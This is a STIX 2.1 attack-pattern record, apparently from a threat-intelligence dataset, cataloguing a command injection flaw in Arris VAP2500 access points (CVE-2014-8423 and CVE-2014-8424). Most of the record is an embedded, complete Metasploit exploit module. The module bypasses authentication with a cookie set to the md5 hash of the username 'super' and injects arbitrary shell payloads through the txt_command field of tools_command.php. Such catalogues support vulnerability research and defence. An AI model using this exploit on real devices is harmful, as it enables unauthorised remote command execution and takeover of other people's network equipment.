{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed6c127d-a188-4525-85bd-320e33a0b8fb",
    "created": "2024-08-14T17:02:06.503493Z",
    "modified": "2024-08-14T17:02:06.503497Z",
    "name": "Arris VAP2500 tools_command.php Command Execution",
    "description": " Arris VAP2500 access points are vulnerable to OS command injection in the web management portal via the tools_command.php page. Though authentication is required to access this page, it is trivially bypassed by setting the value of a cookie to an md5 hash of a valid username. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vap2500_tools_command_exec.rb",
            "external_id": "vap2500_tools_command_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8423"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8424"
        },
        {
            "source_name": "reference",
            "url": "http://goto.fail/blog/2014/11/25/at-and-t-u-verse-vap2500-the-passwords-they-do-nothing/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Arris VAP2500 tools_command.php Command Execution',\n      'Description' => %q{\n        Arris VAP2500 access points are vulnerable to OS command injection in the web management\n        portal via the tools_command.php page. Though authentication is required to access this\n        page, it is trivially bypassed by setting the value of a cookie to an md5 hash of a valid\n        username.\n      },\n      'Author'      =>\n        [\n          'HeadlessZeke' # Vulnerability discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-8423'],\n          ['CVE', '2014-8424'],\n          ['OSVDB', '115045'],\n          ['OSVDB', '115046'],\n          ['BID', '71297'],\n          ['BID', '71299'],\n          ['URL', 'http://goto.fail/blog/2014/11/25/at-and-t-u-verse-vap2500-the-passwords-they-do-nothing/']\n        ],\n      'DisclosureDate' => '2014-11-25',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet'\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DefaultTarget' => 0\n      ))\n  end\n\n  def check\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => '/tools_command.php',\n        'cookie' => \"p=#{Rex::Text.md5('super')}\"\n      })\n      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/\n        return Exploit::CheckCode::Vulnerable\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"Exploiting...\")\n\n    if datastore['PAYLOAD'] == 'cmd/unix/generic'\n      exploit_cmd\n    else\n      exploit_session\n    end\n  end\n\n  def exploit_cmd\n    beg_boundary = rand_text_alpha(8)\n    end_boundary = rand_text_alpha(8)\n\n    begin\n      res = send_request_cgi({\n        'uri'    => normalize_uri('/', 'tools_command.php'),\n        'vars_post' => {\n          'cmb_header'  => '',\n          'txt_command' => \"echo #{beg_boundary}; #{payload.encoded}; echo #{end_boundary}\"\n        },\n        'method' => 'POST',\n        'cookie' => \"p=#{Rex::Text.md5('super')}\"\n      })\n\n      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/\n        print_good(\"Command sent successfully\")\n        if res.body.to_s =~ /#{beg_boundary}(.*)#{end_boundary}/m\n          print_status(\"Command output: #{$1}\")\n        end\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Command execution failed\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def exploit_session\n    begin\n      send_request_cgi({\n        'uri'    => normalize_uri('/', 'tools_command.php'),\n        'vars_post' => {\n         'cmb_header'  => '',\n         'txt_command' => \"#{payload.encoded}\"\n        },\n        'method' => 'POST',\n        'cookie' => \"p=#{Rex::Text.md5('super')}\"\n      }, 3)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-25",
    "x_mitre_platforms": [
        "unix'"
    ]
}